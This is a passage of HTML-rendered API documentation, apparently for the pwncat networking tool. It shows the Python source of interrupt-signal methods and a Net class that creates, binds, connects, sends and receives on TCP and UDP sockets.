    <span class="hljs-string">"""Signal the application that STDIN has received EOF."""</span>
    <span class="hljs-comment"># self.__log.trace("SIGNAL STDIN-EOF raised")  # type: ignore</span>
    self.__stdin_eof = <span class="hljs-literal">True</span>
    self.raise_stdin_quit()</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.InterruptHandler.raise_stdin_quit"><code class="name flex">
                            <span>def <span
                                    class="ident">raise_stdin_quit</span></span>(<span>self)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Signal the application that STDIN should be
                                quit.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">raise_stdin_quit</span>(<span
                                        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; None</span>
    <span class="hljs-string">"""Signal the application that STDIN should be quit."""</span>
    <span class="hljs-comment"># self.__log.trace("SIGNAL STDIN-QUIT raised")  # type: ignore</span>
    self.__stdin_quit = <span class="hljs-literal">True</span>
    <span class="hljs-comment"># If --no-shutdown or -keep-open is specified</span>
    <span class="hljs-comment"># pwncat will not invoke shutdown on a socket after seeing EOF on stdin</span>
    <span class="hljs-keyword">if</span> <span
                                            class="hljs-keyword">not</span> (self.__no_shutdown <span
                                            class="hljs-keyword">or</span> self.__keep_open):
        <span class="hljs-comment"># No more data from stdin, we can tell the remote side we are done</span>
        <span class="hljs-comment"># by closing the socket for sending (they will receive an EOF).</span>
        self.raise_sock_send_eof()</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.InterruptHandler.raise_terminate"><code class="name flex">
                            <span>def <span
                                    class="ident">raise_terminate</span></span>(<span>self)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Signal the application that Socket should be
                                quit.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">raise_terminate</span>(<span
                                        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; None</span>
    <span class="hljs-string">"""Signal the application that Socket should be quit."""</span>
    self.__log.trace(<span class="hljs-string">"SIGNAL TERMINATE raised"</span>)  <span
                                            class="hljs-comment"># type: ignore</span>
    self.__terminate = <span class="hljs-literal">True</span>
    self.__sock_quit = <span class="hljs-literal">True</span>
    self.__stdin_quit = <span class="hljs-literal">True</span>
    self.__command_quit = <span class="hljs-literal">True</span></code></pre>
                            </details>
                        </dd>
                    </dl>
                </dd>
                <dt id="pwncat.Net"><code class="flex name class">
                    <span>class <span class="ident">Net</span></span>
                    <span>(</span><span>encoder, ssig, options)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>Provides an abstracted server client socket for TCP and
                        UDP.</p>
                        <p>Instantiate Sock class.</p>
                        <h2 id="args">Args</h2>
                        <dl>
                            <dt><strong><code>encoder</code></strong> :<code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.StringEncoder"
                                    title="pwncat.StringEncoder">StringEncoder</a></code>
                            </dt>
                            <dd>Instance of StringEncoder (Python2/3 str/byte compat).</dd>
                            <dt><strong><code>ssig</code></strong> :<code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.InterruptHandler"
                                    title="pwncat.InterruptHandler">InterruptHandler</a></code>
                            </dt>
                            <dd>Used to stop blocking loops.</dd>
                            <dt><strong><code>options</code></strong> :<code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsSock"
                                    title="pwncat.DsSock">DsSock</a></code>
                            </dt>
                            <dd>Instance of DsSock.</dd>
                        </dl>
                    </div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span
                                class="hljs-title">Net</span>(<span
                                class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""Provides an abstracted server client socket for TCP and UDP."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor / Destructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, encoder, ssig, options</span>):</span>
        <span class="hljs-comment"># type: (StringEncoder, InterruptHandler, DsSock) -&gt; None</span>
        <span class="hljs-string">"""Instantiate Sock class.

        Args:
            encoder (StringEncoder): Instance of StringEncoder (Python2/3 str/byte compat).
            ssig (InterruptHandler): Used to stop blocking loops.
            options (DsSock): Instance of DsSock.
        """</span>
        self.__log = logging.getLogger(__name__)  <span
                                    class="hljs-comment"># type: logging.Logger</span>
        self.__enc = encoder
        self.__ssig = ssig
        self.__options = options
        self.__sock = Sock()

        <span class="hljs-comment"># Set families to listen on or connect to</span>
        <span class="hljs-comment"># Using a list here to ensure IPv6 will always come first</span>
        <span class="hljs-keyword">if</span> self.__options.ipv6:
            self.__families = [int(socket.AF_INET6)]
        <span class="hljs-keyword">elif</span> self.__options.ipv4:
            self.__families = [int(socket.AF_INET)]
        <span class="hljs-keyword">else</span>:
            self.__families = [
                int(socket.AF_INET6),
                int(socket.AF_INET),
            ]

        <span class="hljs-comment"># The connection dictionary.</span>
        <span class="hljs-comment"># A dictionary is necessary, as we can have multiple entries for</span>
        <span class="hljs-comment"># IPv4 and IPv6 when using UDP in server mode.</span>
        <span class="hljs-comment">#</span>
        <span class="hljs-comment"># 1.) If the UDP server wants to send data to an UDP client,</span>
        <span class="hljs-comment"># it must first wait for the client to send data to get to know</span>
        <span class="hljs-comment"># it's IP address (we're not using connect() for UDP here).</span>
        <span class="hljs-comment"># 2.) As we allow IPv4 and IPv6 listening at the same time,</span>
        <span class="hljs-comment"># we must maintain both entries in that list, until the</span>
        <span class="hljs-comment"># UDP client has connected.</span>
        <span class="hljs-comment"># Once the UDP client has connected, all unconnected entries</span>
        <span class="hljs-comment"># will be removed and the protocol has been determined.</span>
        <span class="hljs-comment"># {</span>
        <span class="hljs-comment">#   &lt;socket.family&gt;:</span>
        <span class="hljs-comment">#     {</span>
        <span class="hljs-comment">#       "sock": socket.socket,      # &lt;-- bind socket if server</span>
        <span class="hljs-comment">#       "conn": socket.socket,      # &lt;-- send/recv socket</span>
        <span class="hljs-comment">#       "local_host": &lt;hostname&gt;,   # &lt;-- (server only) hostname or ip address for binding</span>
        <span class="hljs-comment">#       "local_addr": &lt;ip-addr&gt;,    # &lt;-- (server only) ip address for binding</span>
        <span class="hljs-comment">#       "local_port": &lt;port&gt;,       # &lt;-- (server only) port for binding</span>
        <span class="hljs-comment">#       "remote_host": &lt;hostname&gt;,  # &lt;-- hostname or ip address of remote end</span>
        <span class="hljs-comment">#       "remote_addr": &lt;ip-addr&gt;,   # &lt;-- numerical ip address of remote end</span>
        <span class="hljs-comment">#       "remote_port": &lt;port&gt;,      # &lt;-- port of remote end</span>
        <span class="hljs-comment">#     },</span>
        <span class="hljs-comment"># }</span>
        self.__conns = {}  <span class="hljs-comment"># type: Dict[int, SockConn]</span>

        <span class="hljs-comment"># The self.__conns dictionary can hold two entries: IPv4 and IPv6.</span>
        <span class="hljs-comment"># In client mode after successful connect, the unused entry is dropped.</span>
        <span class="hljs-comment"># In server mode we keep entries for TCP/re-accept() or UDP/connect.</span>
        <span class="hljs-comment">#</span>
        <span class="hljs-comment"># That would mean for send/recv functions in server mode, we would</span>
        <span class="hljs-comment"># always have to loop around entries in self.__conns. To avoid this</span>
        <span class="hljs-comment"># we keep track of the currently active connection in self.__active</span>
        <span class="hljs-comment"># and only use this,</span>
        <span class="hljs-comment"># {</span>
        <span class="hljs-comment">#    "af": socket.family,        # &lt;-- the used socket family</span>
        <span class="hljs-comment">#    "conn": socket.socket,      # &lt;-- send/recv socket</span>
        <span class="hljs-comment">#    "remote_addr": &lt;ip-addr&gt;,   # &lt;-- numerical ip address of remote end</span>
        <span class="hljs-comment">#    "remote_port": &lt;port&gt;,      # &lt;-- port of remote end</span>
        <span class="hljs-comment"># }</span>
        self.__active = {}  <span class="hljs-comment"># type: SockActive</span>

        self.__udp_mode_server = <span class="hljs-literal">False</span>  <span
                                    class="hljs-comment"># type: bool</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Public Send / Receive Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_eof</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Close the active socket for sending. The remote part will get an EOF."""</span>
        self.__sock.shutdown_send(self.__active[<span class="hljs-string">"conn"</span>], <span
                                    class="hljs-string">"conn"</span>)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">send</span>(<span class="hljs-params">self, data</span>):</span>
        <span class="hljs-comment"># type: (bytes) -&gt; int</span>
        <span class="hljs-string">"""Send data through a connected (TCP) or unconnected (UDP) socket.

        Args:
            data (bytes): The data to send.

        Returns:
            int: Returns total bytes sent.

        Raises:
            socket.error:   Except here when unconnected or connection was forcibly closed.
        """</span>
        <span class="hljs-comment"># UDP has some specialities as its socket is unconnected.</span>
        <span class="hljs-comment"># See also recv() for specialities on that side.</span>

        <span class="hljs-comment"># In case of sending data to an UDP client, we need to initially wait</span>
        <span class="hljs-comment"># until the client has first connected and told us its addr/port.</span>
        <span class="hljs-keyword">if</span> self.__udp_mode_server:
            <span class="hljs-comment"># self.__active will be set in recv() by another thread</span>
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__active:
                self.__log.warning(<span class="hljs-string">"UDP client has not yet connected. Queueing message"</span>)
                <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> self.__active:
                    <span class="hljs-keyword">if</span> self.__ssig.has_sock_quit():
                        self.__log.trace(  <span class="hljs-comment"># type: ignore</span>
                            <span class="hljs-string">"SOCK-QUIT signal ACK in Net.send (while waiting for UDP client)"</span>
                        )
                        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>
                    time.sleep(<span class="hljs-number">0.01</span>)

        curr = <span class="hljs-number">0</span>  <span class="hljs-comment"># bytes send during one loop iteration</span>
        send = <span class="hljs-number">0</span>  <span
                                    class="hljs-comment"># total bytes send</span>
        size = len(data)  <span class="hljs-comment"># bytes of data that needs to be send</span>

        <span class="hljs-comment"># Loop until all bytes have been send</span>
        <span class="hljs-keyword">while</span> send &lt; size:
            self.__log.debug(
                <span class="hljs-string">"Trying to send %d bytes to %s:%d"</span>,
                size - send,
                self.__active[<span class="hljs-string">"remote_addr"</span>],
                self.__active[<span class="hljs-string">"remote_port"</span>],
            )
            self.__log.trace(<span class="hljs-string">"Trying to send: %s"</span>, repr(data))  <span
                                    class="hljs-comment"># type: ignore</span>
            <span class="hljs-keyword">try</span>:
                <span class="hljs-comment"># Only UDP server has not made a connect() to the socket, all others</span>
                <span class="hljs-comment"># are already connected and need to use send() instead of sendto()</span>
                <span class="hljs-keyword">if</span> self.__udp_mode_server:
                    curr = self.__active[<span class="hljs-string">"conn"</span>].sendto(
                        data, (self.__active[<span class="hljs-string">"remote_addr"</span>], self.__active[<span
                                    class="hljs-string">"remote_port"</span>])
                    )
                    send += curr
                <span class="hljs-keyword">else</span>:
                    curr = self.__active[<span class="hljs-string">"conn"</span>].send(data)
                    send += curr
                <span class="hljs-keyword">if</span> curr == <span class="hljs-number">0</span>:
                    self.__log.error(<span
                                    class="hljs-string">"No bytes send during loop round."</span>)
                    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>
                <span class="hljs-comment"># Remove 'curr' many bytes from byte for the next round</span>
                data = data[curr:]
                self.__log.debug(
                    <span class="hljs-string">"Sent %d bytes to %s:%d (%d bytes remaining)"</span>,
                    curr,
                    self.__active[<span class="hljs-string">"remote_addr"</span>],
                    self.__active[<span class="hljs-string">"remote_port"</span>],
                    size - send,
                )
            <span class="hljs-keyword">except</span> (IOError, OSError, socket.error) <span
                                    class="hljs-keyword">as</span> error:
                msg = <span class="hljs-string">"Socket send Error: {}"</span>.format(error)
                <span class="hljs-keyword">raise</span> socket.error(msg)
        <span class="hljs-keyword">return</span> send

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">receive</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bytes</span>
        <span class="hljs-string">"""Receive and return data from the connected (TCP) or unconnected (UDP) socket.

        Returns:
            bytes: Returns received data from connected (TCP) or unconnected (UDP) socket.

        Raises:
            socket.timeout: Except here to do an action when the socket is not busy.
            AttributeError: Except here when current instance has closed itself (Ctrl+c).
            socket.error:   Except here when unconnected or connection was forcibly closed.
            EOFError:       Except here when upstream has closed the connection via EOF.
        """</span>
        <span class="hljs-comment"># This is required for a UDP server that has no connected clients yet</span>
        <span class="hljs-comment"># and is waiting for data receival for the first time on either IPv4 or IPv6</span>
        <span class="hljs-comment"># to finally determine which of those two we're going to use and which</span>
        <span class="hljs-comment"># of them we will remove after succesfull connect.</span>
        <span class="hljs-keyword">try</span>:
            conns = select.select(
                [self.__conns[af][<span class="hljs-string">"conn"</span>] <span
                                    class="hljs-keyword">for</span> af <span
                                    class="hljs-keyword">in</span> self.__conns <span
                                    class="hljs-keyword">if</span> <span
                                    class="hljs-string">"conn"</span> <span
                                    class="hljs-keyword">in</span> self.__conns[af]],
                [],
                [],
                self.__options.recv_timeout,
            )[
                <span class="hljs-number">0</span>
            ]  <span class="hljs-comment"># type: List[socket.socket]</span>
        <span class="hljs-comment"># E.g.: ValueError: file descriptor cannot be a negative integer (-1)</span>
        <span class="hljs-keyword">except</span> (ValueError, AttributeError) <span
                                    class="hljs-keyword">as</span> error:
            msg = <span class="hljs-string">"Connection was closed by self: [1]: {}"</span>.format(error)
            self.__log.debug(msg)
            <span class="hljs-keyword">raise</span> AttributeError(msg)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> conns:
            <span class="hljs-comment"># This is raised for the calling function to determine what to do</span>
            <span class="hljs-comment"># between timeouts (e.g.: check signals, etc)</span>
            <span class="hljs-keyword">raise</span> socket.timeout(<span class="hljs-string">"timed out"</span>)  <span
                                    class="hljs-comment"># type: ignore</span>

        <span class="hljs-comment"># We should always only have one active socket on which we receive data.</span>
        <span class="hljs-keyword">assert</span> len(conns) == <span class="hljs-number">1</span>
        conn = conns[<span class="hljs-number">0</span>]  <span class="hljs-comment"># type: socket.socket</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># https://manpages.debian.org/buster/manpages-dev/recv.2.en.html</span>
            (data, addr) = conn.recvfrom(self.__options.bufsize)

        <span class="hljs-comment"># [1/5] When closing itself (e.g.: via Ctrl+c and the socket_close() funcs are called)</span>
        <span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> error:
            msg = <span class="hljs-string">"Connection was closed by self: [2]: {}"</span>.format(error)
            self.__log.debug(msg)
            <span class="hljs-keyword">raise</span> AttributeError(msg)

        <span class="hljs-comment"># [2/5] Connection was forcibly closed</span>
        <span class="hljs-comment"># [Errno 107] Transport endpoint is not connected</span>
        <span class="hljs-comment"># [Errno 10054] An existing connection was forcibly closed by the remote host</span>
        <span class="hljs-comment"># [WinError 10054] An existing connection was forcibly closed by the remote host</span>
        <span class="hljs-keyword">except</span> (OSError, socket.error) <span class="hljs-keyword">as</span> error:
            self.__log.debug(<span class="hljs-string">"Connection error: %s"</span>, error)
            <span class="hljs-keyword">raise</span> socket.error(error)

        <span class="hljs-comment"># [3/5] Upstream (server or client) is gone.</span>
        <span class="hljs-comment"># In TCP, there is no such thing as an empty message, so zero means a peer disconnect.</span>
        <span class="hljs-comment"># In UDP, there is no such thing as a peer disconnect, so zero means an empty datagram.</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:
            msg = <span class="hljs-string">"EOF: Remote finished sending."</span>
            self.__log.info(msg)
            <span class="hljs-keyword">raise</span> EOFError(msg)

        <span class="hljs-comment"># [4/5] (UDP Server mode only)</span>
        <span class="hljs-comment"># 1.) The UDP server is only able to send data, if a client has sent data first,</span>
        <span class="hljs-comment"># as we do not do a connect() phase for UDP and therefore do not know its remote</span>
        <span class="hljs-comment"># addr/port before. See send() function for a blocking loop.</span>
        <span class="hljs-comment"># 2.) Additionally, we will always update its IP/port values to distinguish</span>
        <span class="hljs-comment"># the same connected client between a new/different connected client.</span>
        <span class="hljs-keyword">if</span> self.__udp_mode_server:
            <span class="hljs-comment"># UDP client connects for the first time</span>
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__active:
                self.__log.info(
                    <span class="hljs-string">"Client connected: %s:%d (family %d/%s, UDP)"</span>,
                    addr[<span class="hljs-number">0</span>],
                    addr[<span class="hljs-number">1</span>],
                    int(conn.family),
                    self.__sock.get_family_name(conn.family),
                )
            <span class="hljs-comment"># A different UDP client connects</span>
            <span class="hljs-keyword">elif</span> self.__active[<span class="hljs-string">"remote_addr"</span>] != addr[<span
                                    class="hljs-number">0</span>] <span
                                    class="hljs-keyword">or</span> self.__active[<span
                                    class="hljs-string">"remote_port"</span>] != addr[<span
                                    class="hljs-number">1</span>]:
                self.__log.info(
                    <span class="hljs-string">"New client connected: %s:%d (family %d/%s, UDP)"</span>,
                    addr[<span class="hljs-number">0</span>],
                    addr[<span class="hljs-number">1</span>],
                    int(conn.family),
                    self.__sock.get_family_name(conn.family),
                )
            <span class="hljs-comment"># Set currently active UDP connection socket</span>
            self.__active = {
                <span class="hljs-string">"af"</span>: conn.family,
                <span class="hljs-string">"conn"</span>: conn,
                <span class="hljs-string">"remote_addr"</span>: addr[<span
                                    class="hljs-number">0</span>],
                <span class="hljs-string">"remote_port"</span>: addr[<span
                                    class="hljs-number">1</span>],
            }

        <span class="hljs-comment"># [5/5] We have data to process</span>
        self.__log.debug(
            <span class="hljs-string">"Received %d bytes from %s:%d"</span>,
            len(data),
            self.__active[<span class="hljs-string">"remote_addr"</span>],
            self.__active[<span class="hljs-string">"remote_port"</span>],
        )
        self.__log.trace(<span class="hljs-string">"Received: %s"</span>, repr(data))  <span
                                    class="hljs-comment"># type: ignore</span>
        <span class="hljs-keyword">return</span> data

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Public Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_client</span>(<span
            class="hljs-params">self, host, port</span>):</span>
        <span class="hljs-comment"># type: (str, int) -&gt; bool</span>
        <span class="hljs-string">"""Run and create a TCP or UDP client and connect to a remote peer.

        Args:
            addr (str): Numeric IP address to connect to (ensure to resolve a hostname beforehand).
            port (int): Port of the server to connect to.

        Returns:
            bool: Returns `True` on success and `False` on failure.
        """</span>
        <span class="hljs-comment"># The connection dictionary.</span>
        conns = {}  <span class="hljs-comment"># type: Dict[int, SockConn]</span>

        <span class="hljs-comment"># [1/4] Add sockets to connection dictionary</span>
        succ = <span class="hljs-number">0</span>
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> self.__families:
            <span class="hljs-keyword">try</span>:
                conns[family] = {
                    <span class="hljs-string">"conn"</span>: self.__sock.create_socket(
                        family,
                        socket.SOCK_DGRAM <span
                                    class="hljs-keyword">if</span> self.__options.udp <span
                                    class="hljs-keyword">else</span> socket.SOCK_STREAM,
                        <span class="hljs-literal">True</span>,
                        self.__options.ip_tos,
                    )
                }
                succ += <span class="hljs-number">1</span>
            <span class="hljs-keyword">except</span> socket.error:
                <span class="hljs-keyword">pass</span>
        <span class="hljs-keyword">if</span> succ == <span class="hljs-number">0</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        <span class="hljs-comment"># [2/4] Resolve address</span>
        remove = []
        errors = []
        <span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> We're still looping over the initial family list</span>
        <span class="hljs-comment"># to ensure order: IPv6 before IPv4 (the conn dict does not preserve order)</span>
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> self.__families:
            <span class="hljs-keyword">if</span> family <span class="hljs-keyword">in</span> conns:
                <span class="hljs-keyword">try</span>:
                    conns[family][<span class="hljs-string">"remote_host"</span>] = host
                    conns[family][<span class="hljs-string">"remote_addr"</span>] = self.__sock.gethostbyname(
                        host, family, <span class="hljs-keyword">not</span> self.__options.nodns
                    )
                    conns[family][<span class="hljs-string">"remote_port"</span>] = port
                <span class="hljs-keyword">except</span> socket.gaierror <span class="hljs-keyword">as</span> err:
                    remove.append(family)
                    errors.append(str(err))
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> remove:
            self.__sock.close(conns[family][<span class="hljs-string">"conn"</span>], self.__sock.get_family_name(family))
            <span class="hljs-keyword">del</span> conns[family]
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> conns:
            <span class="hljs-keyword">for</span> error <span class="hljs-keyword">in</span> errors:
                self.__log.error(<span class="hljs-string">"Resolve Error: %s"</span>, error)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        <span class="hljs-comment"># [3/4] Connect</span>
        remove = []
        errors = []
        <span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> We're still looping over the initial family list</span>
        <span class="hljs-comment"># to ensure order: IPv6 before IPv4 (the conn dict does not preserve order)</span>
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> self.__families:
            <span class="hljs-keyword">if</span> family <span class="hljs-keyword">in</span> conns:
                <span class="hljs-keyword">try</span>:
                    self.__sock.connect(
                        conns[family][<span class="hljs-string">"conn"</span>],
                        conns[family][<span class="hljs-string">"remote_addr"</span>],
                        conns[family][<span class="hljs-string">"remote_port"</span>],
                        self.__options.src_addr,
                        self.__options.src_port,
                        self.__options.udp_sconnect,
                        self.__enc.encode(self.__options.udp_sconnect_word),
                        self.__options.bufsize,
                    )
                    <span class="hljs-comment"># On successful connect, we can abandon/remove all other sockets</span>
                    remove = [key <span class="hljs-keyword">for</span> key <span
                                    class="hljs-keyword">in</span> conns <span class="hljs-keyword">if</span> key != family]
                    <span class="hljs-keyword">break</span>
                <span class="hljs-keyword">except</span> (OSError, socket.error) <span
                                    class="hljs-keyword">as</span> err:
                    remove.append(family)
                    errors.append(str(err))
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> remove:
            self.__sock.close(conns[family][<span class="hljs-string">"conn"</span>], self.__sock.get_family_name(family))
            <span class="hljs-keyword">del</span> conns[family]
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> conns:
            <span class="hljs-keyword">for</span> error <span class="hljs-keyword">in</span> errors:
                self.__log.error(error)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        <span class="hljs-comment"># [4/4] Store connections and set active connection</span>
        <span class="hljs-keyword">assert</span> len(conns) == <span class="hljs-number">1</span>
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> conns:
            self.__active = {
                <span class="hljs-string">"af"</span>: family,
                <span class="hljs-string">"conn"</span>: conns[family][<span class="hljs-string">"conn"</span>],
                <span class="hljs-string">"remote_addr"</span>: conns[family][<span
                                    class="hljs-string">"remote_addr"</span>],
                <span class="hljs-string">"remote_port"</span>: conns[family][<span
                                    class="hljs-string">"remote_port"</span>],
            }
        <span class="hljs-comment"># Store sockets as a list</span>
        self.__conns = conns
        <span class="hljs-comment"># Print socket info</span>
        <span class="hljs-keyword">for</span> info <span class="hljs-keyword">in</span> self.__sock.get_sock_opts(self.__active[<span
                                    class="hljs-string">"conn"</span>], self.__options.info):
            self.__log.info(<span class="hljs-string">"[%s] %s"</span>, self.__sock.get_family_name(family), info)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_server</span>(<span
            class="hljs-params">self, host, port</span>):</span>
        <span class="hljs-comment"># type: (Optional[str], int) -&gt; bool</span>
        <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> Integrate: --rebind(-wait|-robin)</span>
        <span class="hljs-string">"""Run and create a TCP or UDP listening server and wait for a client to connect.

        Args:
            addr (str): Numeric IP address to bind to (ensure to resolve a hostname beforehand).
            port (int): Port of the address to bind to.

        Returns:
            bool: Returns `True` on success and `False` on failure.
        """</span>
        <span class="hljs-comment"># The connection dictionary.</span>
        conns = {}  <span class="hljs-comment"># type: Dict[int, SockConn]</span>

        <span class="hljs-comment"># [1/4] Create socket</span>
        succ = <span class="hljs-number">0</span>
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> self.__families:
            <span class="hljs-keyword">try</span>:
                conns[family] = {
                    <span class="hljs-string">"sock"</span>: self.__sock.create_socket(
                        family,
                        socket.SOCK_DGRAM <span
                                    class="hljs-keyword">if</span> self.__options.udp <span
                                    class="hljs-keyword">else</span> socket.SOCK_STREAM,
                        <span class="hljs-literal">True</span>,
                        self.__options.ip_tos,
                    )
                }
                succ += <span class="hljs-number">1</span>
            <span class="hljs-keyword">except</span> socket.error <span
                                    class="hljs-keyword">as</span> err:
                self.__log.debug(err)
        <span class="hljs-keyword">if</span> succ == <span class="hljs-number">0</span>:
            self.__log.error(<span class="hljs-string">"Socket Error: Could not create any socket."</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        <span class="hljs-comment"># [2/4] Resolve local address</span>
        remove = {}
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> conns:
            <span class="hljs-keyword">try</span>:
                conns[family][<span class="hljs-string">"local_addr"</span>] = self.__sock.gethostbyname(
                    host, family, <span class="hljs-keyword">not</span> self.__options.nodns
                )
                conns[family][<span class="hljs-string">"local_host"</span>] = host
                conns[family][<span class="hljs-string">"local_port"</span>] = port
            <span class="hljs-keyword">except</span> socket.gaierror <span
                                    class="hljs-keyword">as</span> err:
                remove[family] = str(err)
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> remove:
            self.__log.debug(
                <span class="hljs-string">"Removing (family %d/%s) due to: %s"</span>,
                family,
                self.__sock.get_family_name(family),
                remove[family],
            )
            self.__sock.close(conns[family][<span class="hljs-string">"sock"</span>], self.__sock.get_family_name(family))
            <span class="hljs-keyword">del</span> conns[family]
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> conns:
            self.__log.error(<span class="hljs-string">"Resolve Error: Could not resolve any hostname"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        <span class="hljs-comment"># [3/4] Bind socket</span>
        remove = {}
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> conns:
            <span class="hljs-keyword">try</span>:
                self.__sock.bind(conns[family][<span class="hljs-string">"sock"</span>], conns[family][<span
                                    class="hljs-string">"local_addr"</span>], port)
            <span class="hljs-keyword">except</span> socket.error <span
                                    class="hljs-keyword">as</span> err:
                remove[family] = str(err)
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> remove:
            self.__log.debug(
                <span class="hljs-string">"Removing (family %d/%s) due to: %s"</span>,
                family,
                self.__sock.get_family_name(family),
                remove[family],
            )
            self.__sock.close(conns[family][<span class="hljs-string">"sock"</span>], self.__sock.get_family_name(family))
            <span class="hljs-keyword">del</span> conns[family]
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> conns:
            self.__log.error(<span class="hljs-string">"Bind Error: Could not bind any socket"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        <span class="hljs-comment"># [UDP 4/4] There is no listen or accept for UDP</span>
        <span class="hljs-keyword">if</span> self.__options.udp:
            <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> conns:
                conns[family][<span class="hljs-string">"conn"</span>] = conns[family][<span
                                    class="hljs-string">"sock"</span>]
                self.__log.info(
                    <span class="hljs-string">"Listening on %s:%d (family %d/%s, UDP)"</span>,
                    conns[family][<span class="hljs-string">"local_addr"</span>],
                    conns[family][<span class="hljs-string">"local_port"</span>],
                    family,
                    self.__sock.get_family_name(family),
                )
            self.__conns = conns
            self.__udp_mode_server = <span class="hljs-literal">True</span>
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

        <span class="hljs-comment"># [TCP 4/4] Requires listen and accept</span>
        <span class="hljs-comment"># (1/3) Listen</span>
        remove = {}
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> conns:
            <span class="hljs-keyword">try</span>:
                self.__sock.listen(conns[family][<span class="hljs-string">"sock"</span>], self.__options.backlog)
                self.__log.info(
                    <span class="hljs-string">"Listening on %s:%d (family %d/%s, TCP)"</span>,
                    conns[family][<span class="hljs-string">"local_addr"</span>],
                    conns[family][<span class="hljs-string">"local_port"</span>],
                    family,
                    self.__sock.get_family_name(family),
                )
            <span class="hljs-keyword">except</span> socket.error <span
                                    class="hljs-keyword">as</span> err:
                remove[family] = str(err)
        <span class="hljs-keyword">for</span> family <span class="hljs-keyword">in</span> remove:
            self.__log.debug(
                <span class="hljs-string">"Removing (family %d/%s) due to: %s"</span>,
                family,
                self.__sock.get_family_name(family),
                remove[family],
            )
            self.__sock.close(conns[family][<span class="hljs-string">"sock"</span>], self.__sock.get_family_name(family))
            <span class="hljs-keyword">del</span> conns[family]
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> conns:
            self.__log.error(<span class="hljs-string">"Could not listen on any address"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        <span class="hljs-comment"># (2/3) Accept</span>
        remove = {}
        <span class="hljs-keyword">try</span>:
            conn, client = self.__sock.accept(
                [conns[family][<span class="hljs-string">"sock"</span>] <span class="hljs-keyword">for</span> family <span
